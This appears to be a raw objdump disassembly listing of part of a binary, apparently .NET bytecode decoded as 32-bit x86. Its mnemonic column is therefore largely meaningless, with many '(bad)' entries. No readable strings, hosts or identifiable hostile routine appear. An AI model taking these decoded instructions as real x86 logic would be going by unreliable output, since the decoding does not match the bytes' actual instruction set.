  403701:	00 00                	add    %al,(%eax)
  403703:	04 0b                	add    $0xb,%al
  403705:	02 7c 2b 00          	add    0x0(%ebx,%ebp,1),%bh
  403709:	00 04 fe             	add    %al,(%esi,%edi,8)
  40370c:	15 32 00 00 01       	adc    $0x1000032,%eax
  403711:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  403717:	00 00                	add    %al,(%eax)
  403719:	04 12                	add    $0x12,%al
  40371b:	01 28                	add    %ebp,(%eax)
  40371d:	be 00 00 0a 02       	mov    $0x20a0000,%esi
  403722:	7b 29                	jnp    0x40374d
  403724:	00 00                	add    %al,(%eax)
  403726:	04 02                	add    $0x2,%al
  403728:	7b 27                	jnp    0x403751
  40372a:	00 00                	add    %al,(%eax)
  40372c:	04 fe                	add    $0xfe,%al
  40372e:	06                   	push   %es
  40372f:	37                   	aaa
  403730:	00 00                	add    %al,(%eax)
  403732:	06                   	push   %es
  403733:	73 86                	jae    0x4036bb
  403735:	00 00                	add    %al,(%eax)
  403737:	0a 28                	or     (%eax),%ch
  403739:	bf 00 00 0a 6f       	mov    $0x6f0a0000,%edi
  40373e:	c0 00 00             	rolb   $0x0,(%eax)
  403741:	0a 02                	or     (%edx),%al
  403743:	14 7d                	adc    $0x7d,%al
  403745:	27                   	daa
  403746:	00 00                	add    %al,(%eax)
  403748:	04 02                	add    $0x2,%al
  40374a:	7b 2a                	jnp    0x403776
  40374c:	00 00                	add    %al,(%eax)
  40374e:	04 0c                	add    $0xc,%al
  403750:	02 08                	add    (%eax),%cl
  403752:	17                   	pop    %ss
  403753:	58                   	pop    %eax
  403754:	7d 2a                	jge    0x403780
  403756:	00 00                	add    %al,(%eax)
  403758:	04 02                	add    $0x2,%al
  40375a:	7b 2a                	jnp    0x403786
  40375c:	00 00                	add    %al,(%eax)
  40375e:	04 20                	add    $0x20,%al
  403760:	ff 00                	incl   (%eax)
  403762:	00 00                	add    %al,(%eax)
  403764:	3f                   	aas
  403765:	0c ff                	or     $0xff,%al
  403767:	ff                   	(bad)
  403768:	ff 02                	incl   (%edx)
  40376a:	7b 29                	jnp    0x403795
  40376c:	00 00                	add    %al,(%eax)
  40376e:	04 28                	add    $0x28,%al
  403770:	c1 00 00             	roll   $0x0,(%eax)
  403773:	0a 6f bb             	or     -0x45(%edi),%ch
  403776:	00 00                	add    %al,(%eax)
  403778:	0a 0b                	or     (%ebx),%cl
  40377a:	12 01                	adc    (%ecx),%al
  40377c:	28 bc 00 00 0a 2d 3f 	sub    %bh,0x3f2d0a00(%eax,%eax,1)
  403783:	02 17                	add    (%edi),%dl
  403785:	25 0a 7d 24 00       	and    $0x247d0a,%eax
  40378a:	00 04 02             	add    %al,(%edx,%eax,1)
  40378d:	07                   	pop    %es
  40378e:	7d 2b                	jge    0x4037bb
  403790:	00 00                	add    %al,(%eax)
  403792:	04 02                	add    $0x2,%al
  403794:	7c 25                	jl     0x4037bb
  403796:	00 00                	add    %al,(%eax)
  403798:	04 12                	add    $0x12,%al
  40379a:	01 02                	add    %eax,(%edx)
  40379c:	28 09                	sub    %cl,(%ecx)
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	2b dd                	sub    %ebp,%ebx
  4037a2:	83 00 00             	addl   $0x0,(%eax)
  4037a5:	00 02                	add    %al,(%edx)
  4037a7:	7b 2b                	jnp    0x4037d4
  4037a9:	00 00                	add    %al,(%eax)
  4037ab:	04 0b                	add    $0xb,%al
  4037ad:	02 7c 2b 00          	add    0x0(%ebx,%ebp,1),%bh
  4037b1:	00 04 fe             	add    %al,(%esi,%edi,8)
  4037b4:	15 32 00 00 01       	adc    $0x1000032,%eax
  4037b9:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  4037bf:	00 00                	add    %al,(%eax)
  4037c1:	04 12                	add    $0x12,%al
  4037c3:	01 28                	add    %ebp,(%eax)
  4037c5:	be 00 00 0a 72       	mov    $0x720a0000,%esi
  4037ca:	9b                   	fwait
  4037cb:	0c 00                	or     $0x0,%al
  4037cd:	70 28                	jo     0x4037f7
  4037cf:	45                   	inc    %ebp
  4037d0:	00 00                	add    %al,(%eax)
  4037d2:	0a de                	or     %dh,%bl
  4037d4:	2c 0d                	sub    $0xd,%al
  4037d6:	02 1f                	add    (%edi),%bl
  4037d8:	fe                   	(bad)
  4037d9:	7d 24                	jge    0x4037ff
  4037db:	00 00                	add    %al,(%eax)
  4037dd:	04 02                	add    $0x2,%al
  4037df:	14 7d                	adc    $0x7d,%al
  4037e1:	26 00 00             	add    %al,%es:(%eax)
  4037e4:	04 02                	add    $0x2,%al
  4037e6:	14 7d                	adc    $0x7d,%al
  4037e8:	28 00                	sub    %al,(%eax)
  4037ea:	00 04 02             	add    %al,(%edx,%eax,1)
  4037ed:	14 7d                	adc    $0x7d,%al
  4037ef:	29 00                	sub    %eax,(%eax)
  4037f1:	00 04 02             	add    %al,(%edx,%eax,1)
  4037f4:	7c 25                	jl     0x40381b
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	04 09                	add    $0x9,%al
  4037fa:	28 c2                	sub    %al,%dl
  4037fc:	00 00                	add    %al,(%eax)
  4037fe:	0a de                	or     %dh,%bl
  403800:	28 02                	sub    %al,(%edx)
  403802:	1f                   	pop    %ds
  403803:	fe                   	(bad)
  403804:	7d 24                	jge    0x40382a
  403806:	00 00                	add    %al,(%eax)
  403808:	04 02                	add    $0x2,%al
  40380a:	14 7d                	adc    $0x7d,%al
  40380c:	26 00 00             	add    %al,%es:(%eax)
  40380f:	04 02                	add    $0x2,%al
  403811:	14 7d                	adc    $0x7d,%al
  403813:	28 00                	sub    %al,(%eax)
  403815:	00 04 02             	add    %al,(%edx,%eax,1)
  403818:	14 7d                	adc    $0x7d,%al
  40381a:	29 00                	sub    %eax,(%eax)
  40381c:	00 04 02             	add    %al,(%edx,%eax,1)
  40381f:	7c 25                	jl     0x403846
  403821:	00 00                	add    %al,(%eax)
  403823:	04 28                	add    $0x28,%al
  403825:	c3                   	ret
  403826:	00 00                	add    %al,(%eax)
  403828:	0a 2a                	or     (%edx),%ch
  40382a:	00 00                	add    %al,(%eax)
  40382c:	41                   	inc    %ecx
  40382d:	1c 00                	sbb    $0x0,%al
  40382f:	00 00                	add    %al,(%eax)
  403831:	00 00                	add    %al,(%eax)
  403833:	00 07                	add    %al,(%edi)
  403835:	00 00                	add    %al,(%eax)
  403837:	00 02                	add    %al,(%edx)
  403839:	02 00                	add    (%eax),%al
  40383b:	00 09                	add    %cl,(%ecx)
  40383d:	02 00                	add    (%eax),%al
  40383f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403842:	00 00                	add    %al,(%eax)
  403844:	24 00                	and    $0x0,%al
  403846:	00 01                	add    %al,(%ecx)
  403848:	36 02 7c 25 00       	add    %ss:0x0(%ebp,%eiz,1),%bh
  40384d:	00 04 03             	add    %al,(%ebx,%eax,1)
  403850:	28 c4                	sub    %al,%ah
  403852:	00 00                	add    %al,(%eax)
  403854:	0a 2a                	or     (%edx),%ch
  403856:	00 00                	add    %al,(%eax)
  403858:	1b 30                	sbb    (%eax),%esi
  40385a:	03 00                	add    (%eax),%eax
  40385c:	b6 00                	mov    $0x0,%dh
  40385e:	00 00                	add    %al,(%eax)
  403860:	1e                   	push   %ds
  403861:	00 00                	add    %al,(%eax)
  403863:	11 02                	adc    %eax,(%edx)
  403865:	7b 2c                	jnp    0x403893
  403867:	00 00                	add    %al,(%eax)
  403869:	04 0a                	add    $0xa,%al
  40386b:	06                   	push   %es
  40386c:	2c 5c                	sub    $0x5c,%al
  40386e:	73 33                	jae    0x4038a3
  403870:	00 00                	add    %al,(%eax)
  403872:	06                   	push   %es
  403873:	25 02 7b 2e 00       	and    $0x2e7b02,%eax
  403878:	00 04 7d 16 00 00 04 	add    %al,0x4000016(,%edi,2)
  40387f:	25 02 7b 2f 00       	and    $0x2f7b02,%eax
  403884:	00 04 7d 17 00 00 04 	add    %al,0x4000017(,%edi,2)
  40388b:	fe 06                	incb   (%esi)
  40388d:	34 00                	xor    $0x0,%al
  40388f:	00 06                	add    %al,(%esi)
  403891:	73 b5                	jae    0x403848
  403893:	00 00                	add    %al,(%eax)
  403895:	0a 28                	or     (%eax),%ch
  403897:	b6 00                	mov    $0x0,%dh
  403899:	00 0a                	add    %cl,(%edx)
  40389b:	6f                   	outsl  %ds:(%esi),(%dx)
  40389c:	bb 00 00 0a 0b       	mov    $0xb0a0000,%ebx
  4038a1:	12 01                	adc    (%ecx),%al
  4038a3:	28 bc 00 00 0a 2d 3c 	sub    %bh,0x3c2d0a00(%eax,%eax,1)
  4038aa:	02 16                	add    (%esi),%dl
  4038ac:	25 0a 7d 2c 00       	and    $0x2c7d0a,%eax
  4038b1:	00 04 02             	add    %al,(%edx,%eax,1)
  4038b4:	07                   	pop    %es
  4038b5:	7d 30                	jge    0x4038e7
  4038b7:	00 00                	add    %al,(%eax)
  4038b9:	04 02                	add    $0x2,%al
  4038bb:	7c 2d                	jl     0x4038ea
  4038bd:	00 00                	add    %al,(%eax)
  4038bf:	04 12                	add    $0x12,%al
  4038c1:	01 02                	add    %eax,(%edx)
  4038c3:	28 0a                	sub    %cl,(%edx)
  4038c5:	00 00                	add    %al,(%eax)
  4038c7:	2b de                	sub    %esi,%ebx
  4038c9:	4f                   	dec    %edi
  4038ca:	02 7b 30             	add    0x30(%ebx),%bh
  4038cd:	00 00                	add    %al,(%eax)
  4038cf:	04 0b                	add    $0xb,%al
  4038d1:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  4038d5:	00 04 fe             	add    %al,(%esi,%edi,8)
  4038d8:	15 32 00 00 01       	adc    $0x1000032,%eax
  4038dd:	02 15 25 0a 7d 2c    	add    0x2c7d0a25,%dl
  4038e3:	00 00                	add    %al,(%eax)
  4038e5:	04 12                	add    $0x12,%al
  4038e7:	01 28                	add    %ebp,(%eax)
  4038e9:	be 00 00 0a de       	mov    $0xde0a0000,%esi
  4038ee:	17                   	pop    %ss
  4038ef:	0c 02                	or     $0x2,%al
  4038f1:	1f                   	pop    %ds
  4038f2:	fe                   	(bad)
  4038f3:	7d 2c                	jge    0x403921
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	04 02                	add    $0x2,%al
  4038f9:	7c 2d                	jl     0x403928
  4038fb:	00 00                	add    %al,(%eax)
  4038fd:	04 08                	add    $0x8,%al
  4038ff:	28 c2                	sub    %al,%dl
  403901:	00 00                	add    %al,(%eax)
  403903:	0a de                	or     %dh,%bl
  403905:	13 02                	adc    (%edx),%eax
  403907:	1f                   	pop    %ds
  403908:	fe                   	(bad)
  403909:	7d 2c                	jge    0x403937
  40390b:	00 00                	add    %al,(%eax)
  40390d:	04 02                	add    $0x2,%al
  40390f:	7c 2d                	jl     0x40393e
  403911:	00 00                	add    %al,(%eax)
  403913:	04 28                	add    $0x28,%al
  403915:	c3                   	ret
  403916:	00 00                	add    %al,(%eax)
  403918:	0a 2a                	or     (%edx),%ch
  40391a:	00 00                	add    %al,(%eax)
  40391c:	01 10                	add    %edx,(%eax)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	07                   	pop    %es
  403923:	00 84 8b 00 17 24 00 	add    %al,0x241700(%ebx,%ecx,4)
  40392a:	00 01                	add    %al,(%ecx)
  40392c:	36 02 7c 2d 00       	add    %ss:0x0(%ebp,%ebp,1),%bh
  403931:	00 04 03             	add    %al,(%ebx,%eax,1)
  403934:	28 c4                	sub    %al,%ah
  403936:	00 00                	add    %al,(%eax)
  403938:	0a 2a                	or     (%edx),%ch
  40393a:	2e 73 3f             	jae,pn 0x40397c
  40393d:	00 00                	add    %al,(%eax)
  40393f:	06                   	push   %es
  403940:	80 31 00             	xorb   $0x0,(%ecx)
  403943:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403946:	1e                   	push   %ds
  403947:	02 28                	add    (%eax),%ch
  403949:	93                   	xchg   %eax,%ebx
  40394a:	00 00                	add    %al,(%eax)
  40394c:	0a 2a                	or     (%edx),%ch
  40394e:	00 00                	add    %al,(%eax)
  403950:	1b 30                	sbb    (%eax),%esi
  403952:	03 00                	add    (%eax),%eax
  403954:	65 00 00             	add    %al,%gs:(%eax)
  403957:	00 12                	add    %dl,(%edx)
  403959:	00 00                	add    %al,(%eax)
  40395b:	11 00                	adc    %eax,(%eax)
  40395d:	7e 07                	jle    0x403966
  40395f:	00 00                	add    %al,(%eax)
  403961:	04 7e                	add    $0x7e,%al
  403963:	09 00                	or     %eax,(%eax)
  403965:	00 04 7e             	add    %al,(%esi,%edi,2)
  403968:	07                   	pop    %es
  403969:	00 00                	add    %al,(%eax)
  40396b:	04 8e                	add    $0x8e,%al
  40396d:	69 6f 6f 00 00 0a 9a 	imul   $0x9a0a0000,0x6f(%edi),%ebp
  403974:	28 15 00 00 06 0a    	sub    %dl,0xa060000
  40397a:	06                   	push   %es
  40397b:	28 31                	sub    %dh,(%ecx)
  40397d:	00 00                	add    %al,(%eax)
  40397f:	0a 0b                	or     (%ebx),%cl
  403981:	07                   	pop    %es
  403982:	28 16                	sub    %dl,(%esi)
  403984:	00 00                	add    %al,(%eax)
  403986:	06                   	push   %es
  403987:	07                   	pop    %es
  403988:	28 17                	sub    %dl,(%edi)
  40398a:	00 00                	add    %al,(%eax)
  40398c:	06                   	push   %es
  40398d:	28 1a                	sub    %bl,(%edx)
  40398f:	00 00                	add    %al,(%eax)
  403991:	06                   	push   %es
  403992:	2c 06                	sub    $0x6,%al
  403994:	07                   	pop    %es
  403995:	28 18                	sub    %bl,(%eax)
  403997:	00 00                	add    %al,(%eax)
  403999:	06                   	push   %es
  40399a:	07                   	pop    %es
  40399b:	28 19                	sub    %bl,(%ecx)
  40399d:	00 00                	add    %al,(%eax)
  40399f:	06                   	push   %es
  4039a0:	7e 09                	jle    0x4039ab
  4039a2:	00 00                	add    %al,(%eax)
  4039a4:	04 1f                	add    $0x1f,%al
  4039a6:	1e                   	push   %ds
  4039a7:	1f                   	pop    %ds
  4039a8:	5a                   	pop    %edx
  4039a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4039aa:	6d                   	insl   (%dx),%es:(%edi)
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	0a 1f                	or     (%edi),%bl
  4039af:	3c 5a                	cmp    $0x5a,%al
  4039b1:	20 e8                	and    %ch,%al
  4039b3:	03 00                	add    (%eax),%eax
  4039b5:	00 5a 28             	add    %bl,0x28(%edx)
  4039b8:	2b 00                	sub    (%eax),%eax
  4039ba:	00 0a                	add    %cl,(%edx)
  4039bc:	de 9e 26 de 9b 00    	ficomps 0x9bde26(%esi)
  4039c2:	00 00                	add    %al,(%eax)
  4039c4:	01 10                	add    %edx,(%eax)
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	01 00                	add    %eax,(%eax)
  4039cc:	61                   	popa
  4039cd:	62 00                	bound  %eax,(%eax)
  4039cf:	03 13                	add    (%ebx),%edx
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	01 2e                	add    %ebp,(%esi)
  4039d5:	73 42                	jae    0x403a19
  4039d7:	00 00                	add    %al,(%eax)
  4039d9:	06                   	push   %es
  4039da:	80 33 00             	xorb   $0x0,(%ebx)
  4039dd:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4039e0:	1e                   	push   %ds
  4039e1:	02 28                	add    (%eax),%ch
  4039e3:	93                   	xchg   %eax,%ebx
  4039e4:	00 00                	add    %al,(%eax)
  4039e6:	0a 2a                	or     (%edx),%ch
  4039e8:	13 30                	adc    (%eax),%esi
  4039ea:	02 00                	add    (%eax),%al
  4039ec:	2f                   	das
  4039ed:	00 00                	add    %al,(%eax)
  4039ef:	00 1f                	add    %bl,(%edi)
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	11 12                	adc    %edx,(%edx)
  4039f5:	00 28                	add    %ch,(%eax)
  4039f7:	3e 00 00             	add    %al,%ds:(%eax)
  4039fa:	0a 7d 4e             	or     0x4e(%ebp),%bh
  4039fd:	00 00                	add    %al,(%eax)
  4039ff:	04 12                	add    $0x12,%al
  403a01:	00 15 7d 4d 00 00    	add    %dl,0x4d7d
  403a07:	04 12                	add    $0x12,%al
  403a09:	00 7c 4e 00          	add    %bh,0x0(%esi,%ecx,2)
  403a0d:	00 04 12             	add    %al,(%edx,%edx,1)
  403a10:	00 28                	add    %ch,(%eax)
  403a12:	0b 00                	or     (%eax),%eax
  403a14:	00 2b                	add    %ch,(%ebx)
  403a16:	12 00                	adc    (%eax),%al
  403a18:	7c 4e                	jl     0x403a68
  403a1a:	00 00                	add    %al,(%eax)
  403a1c:	04 28                	add    $0x28,%al
  403a1e:	40                   	inc    %eax
  403a1f:	00 00                	add    %al,(%eax)
  403a21:	0a 2a                	or     (%edx),%ch
  403a23:	00 1b                	add    %bl,(%ebx)
  403a25:	30 04 00             	xor    %al,(%eax,%eax,1)
  403a28:	33 01                	xor    (%ecx),%eax
  403a2a:	00 00                	add    %al,(%eax)
  403a2c:	20 00                	and    %al,(%eax)
  403a2e:	00 11                	add    %dl,(%ecx)
  403a30:	02 7b 35             	add    0x35(%ebx),%bh
  403a33:	00 00                	add    %al,(%eax)
  403a35:	04 0a                	add    $0xa,%al
  403a37:	06                   	push   %es
  403a38:	26 00 06             	add    %al,%es:(%esi)
  403a3b:	2c 0b                	sub    $0xb,%al
  403a3d:	02 73 a9             	add    -0x57(%ebx),%dh
  403a40:	00 00                	add    %al,(%eax)
  403a42:	0a 7d 37             	or     0x37(%ebp),%bh
  403a45:	00 00                	add    %al,(%eax)
  403a47:	04 00                	add    $0x0,%al
  403a49:	06                   	push   %es
  403a4a:	2c 6d                	sub    $0x6d,%al
  403a4c:	02 02                	add    (%edx),%al
  403a4e:	7b 37                	jnp    0x403a87
  403a50:	00 00                	add    %al,(%eax)
  403a52:	04 72                	add    $0x72,%al
  403a54:	bf 0c 00 70 1f       	mov    $0x1f70000c,%edi
  403a59:	35 6f aa 00 00       	xor    $0xaa6f,%eax
  403a5e:	0a 7d 38             	or     0x38(%ebp),%bh
  403a61:	00 00                	add    %al,(%eax)
  403a63:	04 20                	add    $0x20,%al
  403a65:	e8 03 00 00 28       	call   0x28403a6d
  403a6a:	ab                   	stos   %eax,%es:(%edi)
  403a6b:	00 00                	add    %al,(%eax)
  403a6d:	0a 0b                	or     (%ebx),%cl
  403a6f:	18 8d 1e 00 00 01    	sbb    %cl,0x100001e(%ebp)
  403a75:	25 16 02 7b 38       	and    $0x387b0216,%eax
  403a7a:	00 00                	add    %al,(%eax)
  403a7c:	04 a2                	add    $0xa2,%al
  403a7e:	25 17 07 a2 28       	and    $0x28a20717,%eax
  403a83:	ac                   	lods   %ds:(%esi),%al
  403a84:	00 00                	add    %al,(%eax)
  403a86:	0a 6f ad             	or     -0x53(%edi),%ch
  403a89:	00 00                	add    %al,(%eax)
  403a8b:	0a 0c 12             	or     (%edx,%edx,1),%cl
  403a8e:	02 28                	add    (%eax),%ch
  403a90:	ae                   	scas   %es:(%edi),%al
  403a91:	00 00                	add    %al,(%eax)
  403a93:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  403a99:	0a 7d 35             	or     0x35(%ebp),%bh
  403a9c:	00 00                	add    %al,(%eax)
  403a9e:	04 02                	add    $0x2,%al
  403aa0:	08 7d 39             	or     %bh,0x39(%ebp)
  403aa3:	00 00                	add    %al,(%eax)
  403aa5:	04 02                	add    $0x2,%al
  403aa7:	7c 36                	jl     0x403adf
  403aa9:	00 00                	add    %al,(%eax)
  403aab:	04 12                	add    $0x12,%al
  403aad:	02 02                	add    (%edx),%al
  403aaf:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403ab2:	00 2b                	add    %ch,(%ebx)
  403ab4:	dd a9 00 00 00 02    	(bad) 0x2000000(%ecx)
  403aba:	7b 39                	jnp    0x403af5
  403abc:	00 00                	add    %al,(%eax)
  403abe:	04 0c                	add    $0xc,%al
  403ac0:	02 7c 39 00          	add    0x0(%ecx,%edi,1),%bh
  403ac4:	00 04 fe             	add    %al,(%esi,%edi,8)
  403ac7:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403acc:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  403ad2:	00 00                	add    %al,(%eax)
  403ad4:	04 12                	add    $0x12,%al
  403ad6:	02 28                	add    (%eax),%ch
  403ad8:	b0 00                	mov    $0x0,%al
  403ada:	00 0a                	add    %cl,(%edx)
  403adc:	02 7b 38             	add    0x38(%ebx),%bh
  403adf:	00 00                	add    %al,(%eax)
  403ae1:	04 33                	add    $0x33,%al
  403ae3:	1a 02                	sbb    (%edx),%al
  403ae5:	7b 37                	jnp    0x403b1e
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	04 6f                	add    $0x6f,%al
  403aeb:	b1 00                	mov    $0x0,%cl
  403aed:	00 0a                	add    %cl,(%edx)
  403aef:	2c 0d                	sub    $0xd,%al
  403af1:	02 7b 37             	add    0x37(%ebx),%bh
  403af4:	00 00                	add    %al,(%eax)
  403af6:	04 6f                	add    $0x6f,%al
  403af8:	c5 00                	lds    (%eax),%eax
  403afa:	00 0a                	add    %cl,(%edx)
  403afc:	2b 0b                	sub    (%ebx),%ecx
  403afe:	02 7b 37             	add    0x37(%ebx),%bh
  403b01:	00 00                	add    %al,(%eax)
  403b03:	04 6f                	add    $0x6f,%al
  403b05:	c6 00 00             	movb   $0x0,(%eax)
  403b08:	0a 02                	or     (%edx),%al
  403b0a:	14 7d                	adc    $0x7d,%al
  403b0c:	38 00                	cmp    %al,(%eax)
  403b0e:	00 04 de             	add    %al,(%esi,%ebx,8)
  403b11:	18 06                	sbb    %al,(%esi)
  403b13:	16                   	push   %ss
  403b14:	2f                   	das
  403b15:	13 02                	adc    (%edx),%eax
  403b17:	7b 37                	jnp    0x403b50
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	04 2c                	add    $0x2c,%al
  403b1d:	0b 02                	or     (%edx),%eax
  403b1f:	7b 37                	jnp    0x403b58
  403b21:	00 00                	add    %al,(%eax)
  403b23:	04 6f                	add    $0x6f,%al
  403b25:	22 00                	and    (%eax),%al
  403b27:	00 0a                	add    %cl,(%edx)
  403b29:	dc 02                	faddl  (%edx)
  403b2b:	14 7d                	adc    $0x7d,%al
  403b2d:	37                   	aaa
  403b2e:	00 00                	add    %al,(%eax)
  403b30:	04 de                	add    $0xde,%al
  403b32:	03 26                	add    (%esi),%esp
  403b34:	de 00                	fiadds (%eax)
  403b36:	de 17                	ficoms (%edi)
  403b38:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  403b3d:	35 00 00 04 02       	xor    $0x2040000,%eax
  403b42:	7c 36                	jl     0x403b7a
  403b44:	00 00                	add    %al,(%eax)
  403b46:	04 09                	add    $0x9,%al
  403b48:	28 c2                	sub    %al,%dl
  403b4a:	00 00                	add    %al,(%eax)
  403b4c:	0a de                	or     %dh,%bl
  403b4e:	13 02                	adc    (%edx),%eax
  403b50:	1f                   	pop    %ds
  403b51:	fe                   	(bad)
  403b52:	7d 35                	jge    0x403b89
  403b54:	00 00                	add    %al,(%eax)
  403b56:	04 02                	add    $0x2,%al
  403b58:	7c 36                	jl     0x403b90
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	04 28                	add    $0x28,%al
  403b5e:	c3                   	ret
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	0a 2a                	or     (%edx),%ch
  403b63:	00 41 4c             	add    %al,0x4c(%ecx)
  403b66:	00 00                	add    %al,(%eax)
  403b68:	02 00                	add    (%eax),%al
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	19 00                	sbb    %eax,(%eax)
  403b6e:	00 00                	add    %al,(%eax)
  403b70:	c9                   	leave
  403b71:	00 00                	add    %al,(%eax)
  403b73:	00 e2                	add    %ah,%dl
  403b75:	00 00                	add    %al,(%eax)
  403b77:	00 18                	add    %bl,(%eax)
	...
  403b81:	00 00                	add    %al,(%eax)
  403b83:	00 0a                	add    %cl,(%edx)
  403b85:	00 00                	add    %al,(%eax)
  403b87:	00 f9                	add    %bh,%cl
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 03                	add    %al,(%ebx)
  403b8d:	01 00                	add    %eax,(%eax)
  403b8f:	00 03                	add    %al,(%ebx)
  403b91:	00 00                	add    %al,(%eax)
  403b93:	00 13                	add    %dl,(%ebx)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	01 00                	add    %eax,(%eax)
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	00 07                	add    %al,(%edi)
  403b9d:	00 00                	add    %al,(%eax)
  403b9f:	00 01                	add    %al,(%ecx)
  403ba1:	01 00                	add    %eax,(%eax)
  403ba3:	00 08                	add    %cl,(%eax)
  403ba5:	01 00                	add    %eax,(%eax)
  403ba7:	00 17                	add    %dl,(%edi)
  403ba9:	00 00                	add    %al,(%eax)
  403bab:	00 24 00             	add    %ah,(%eax,%eax,1)
  403bae:	00 01                	add    %al,(%ecx)
  403bb0:	36 02 7c 36 00       	add    %ss:0x0(%esi,%esi,1),%bh
  403bb5:	00 04 03             	add    %al,(%ebx,%eax,1)
  403bb8:	28 c4                	sub    %al,%ah
  403bba:	00 00                	add    %al,(%eax)
  403bbc:	0a 2a                	or     (%edx),%ch
  403bbe:	2e 73 47             	jae,pn 0x403c08
  403bc1:	00 00                	add    %al,(%eax)
  403bc3:	06                   	push   %es
  403bc4:	80 3a 00             	cmpb   $0x0,(%edx)
  403bc7:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403bca:	1e                   	push   %ds
  403bcb:	02 28                	add    (%eax),%ch
  403bcd:	93                   	xchg   %eax,%ebx
  403bce:	00 00                	add    %al,(%eax)
  403bd0:	0a 2a                	or     (%edx),%ch
  403bd2:	00 00                	add    %al,(%eax)
  403bd4:	13 30                	adc    (%eax),%esi
  403bd6:	02 00                	add    (%eax),%al
  403bd8:	2f                   	das
  403bd9:	00 00                	add    %al,(%eax)
  403bdb:	00 21                	add    %ah,(%ecx)
  403bdd:	00 00                	add    %al,(%eax)
  403bdf:	11 12                	adc    %edx,(%edx)
  403be1:	00 28                	add    %ch,(%eax)
  403be3:	3e 00 00             	add    %al,%ds:(%eax)
  403be6:	0a 7d 52             	or     0x52(%ebp),%bh
  403be9:	00 00                	add    %al,(%eax)
  403beb:	04 12                	add    $0x12,%al
  403bed:	00 15 7d 51 00 00    	add    %dl,0x517d
  403bf3:	04 12                	add    $0x12,%al
  403bf5:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  403bf9:	00 04 12             	add    %al,(%edx,%edx,1)
  403bfc:	00 28                	add    %ch,(%eax)
  403bfe:	0d 00 00 2b 12       	or     $0x122b0000,%eax
  403c03:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  403c07:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c0a:	40                   	inc    %eax
  403c0b:	00 00                	add    %al,(%eax)
  403c0d:	0a 2a                	or     (%edx),%ch
  403c0f:	1e                   	push   %ds
  403c10:	02 28                	add    (%eax),%ch
  403c12:	93                   	xchg   %eax,%ebx
  403c13:	00 00                	add    %al,(%eax)
  403c15:	0a 2a                	or     (%edx),%ch
  403c17:	46                   	inc    %esi
  403c18:	7e 0f                	jle    0x403c29
  403c1a:	00 00                	add    %al,(%eax)
  403c1c:	04 02                	add    $0x2,%al
  403c1e:	7b 3c                	jnp    0x403c5c
  403c20:	00 00                	add    %al,(%eax)
  403c22:	04 28                	add    $0x28,%al
  403c24:	72 00                	jb     0x403c26
  403c26:	00 0a                	add    %cl,(%edx)
  403c28:	2a 00                	sub    (%eax),%al
  403c2a:	00 00                	add    %al,(%eax)
  403c2c:	1b 30                	sbb    (%eax),%esi
  403c2e:	03 00                	add    (%eax),%eax
  403c30:	85 01                	test   %eax,(%ecx)
  403c32:	00 00                	add    %al,(%eax)
  403c34:	22 00                	and    (%eax),%al
  403c36:	00 11                	add    %dl,(%ecx)
  403c38:	02 7b 3d             	add    0x3d(%ebx),%bh
  403c3b:	00 00                	add    %al,(%eax)
  403c3d:	04 0a                	add    $0xa,%al
  403c3f:	06                   	push   %es
  403c40:	2c 25                	sub    $0x25,%al
  403c42:	02 7e 11             	add    0x11(%esi),%bh
  403c45:	00 00                	add    %al,(%eax)
  403c47:	04 7d                	add    $0x7d,%al
  403c49:	40                   	inc    %eax
  403c4a:	00 00                	add    %al,(%eax)
  403c4c:	04 02                	add    $0x2,%al
  403c4e:	16                   	push   %ss
  403c4f:	7d 41                	jge    0x403c92
  403c51:	00 00                	add    %al,(%eax)
  403c53:	04 38                	add    $0x38,%al
  403c55:	1b 01                	sbb    (%ecx),%eax
  403c57:	00 00                	add    %al,(%eax)
  403c59:	02 7b 40             	add    0x40(%ebx),%bh
  403c5c:	00 00                	add    %al,(%eax)
  403c5e:	04 02                	add    $0x2,%al
  403c60:	7b 41                	jnp    0x403ca3
  403c62:	00 00                	add    %al,(%eax)
  403c64:	04 9a                	add    $0x9a,%al
  403c66:	0b 00                	or     (%eax),%eax
  403c68:	06                   	push   %es
  403c69:	39 98 00 00 00 02    	cmp    %ebx,0x2000000(%eax)
  403c6f:	73 49                	jae    0x403cba
  403c71:	00 00                	add    %al,(%eax)
  403c73:	06                   	push   %es
  403c74:	7d 3f                	jge    0x403cb5
  403c76:	00 00                	add    %al,(%eax)
  403c78:	04 07                	add    $0x7,%al
  403c7a:	28 32                	sub    %dh,(%edx)
  403c7c:	00 00                	add    %al,(%eax)
  403c7e:	0a 2d 05 dd e0 00    	or     0xe0dd05,%ch
  403c84:	00 00                	add    %al,(%eax)
  403c86:	1e                   	push   %ds
  403c87:	28 29                	sub    %ch,(%ecx)
  403c89:	00 00                	add    %al,(%eax)
